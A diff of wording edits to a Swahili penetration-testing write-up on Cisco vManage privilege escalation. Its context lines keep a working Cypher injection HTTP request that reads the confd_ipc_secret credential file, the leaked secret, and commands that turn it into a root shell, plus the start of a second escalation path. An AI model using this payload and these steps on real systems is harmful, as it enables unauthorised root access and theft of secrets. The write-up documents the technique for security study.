@@ -25,7 +25,7 @@ vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-Kumbuka mfano wetu wa Neo4j? Inafanya kazi chini ya ruhusa za mtumiaji `vmanage`, hivyo inaturuhusu kupata faili hiyo kwa kutumia udhaifu wa awali:
+Kumbuka mfano wetu wa Neo4j? Inafanya kazi chini ya haki za mtumiaji `vmanage`, hivyo inaturuhusu kupata faili hiyo kwa kutumia udhaifu wa awali:
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -37,7 +37,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-Programu ya `confd_cli` haisaidii hoja za amri lakini inaita `/usr/bin/confd_cli_user` kwa hoja. Hivyo, tunaweza kuitisha moja kwa moja `/usr/bin/confd_cli_user` kwa seti zetu za hoja. Hata hivyo, haiwezi kusomwa na haki zetu za sasa, hivyo tunapaswa kuipata kutoka rootfs na kuikopi kwa kutumia scp, kusoma msaada, na kuitumia kupata shell:
+Programu ya `confd_cli` haisaidii hoja za amri lakini inaita `/usr/bin/confd_cli_user` kwa hoja. Hivyo, tunaweza kuitisha moja kwa moja `/usr/bin/confd_cli_user` kwa seti zetu za hoja. Hata hivyo, haiwezi kusomeka kwa ruhusa zetu za sasa, hivyo tunapaswa kuipata kutoka rootfs na kuikopi kwa kutumia scp, kusoma msaada, na kuitumia kupata shell:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -61,7 +61,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 Blogu¹ ya timu ya synacktiv ilielezea njia nzuri ya kupata root shell, lakini tatizo ni kwamba inahitaji kupata nakala ya `/usr/bin/confd_cli_user` ambayo inaweza kusomwa tu na root. Nilipata njia nyingine ya kupandisha hadhi hadi root bila usumbufu kama huo.
 
-Nilipovunja kipande cha `/usr/bin/confd_cli` binary, niliona yafuatayo:
+Nilipovunja kipande cha `/usr/bin/confd_cli`, niliona yafuatayo:
 ```
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
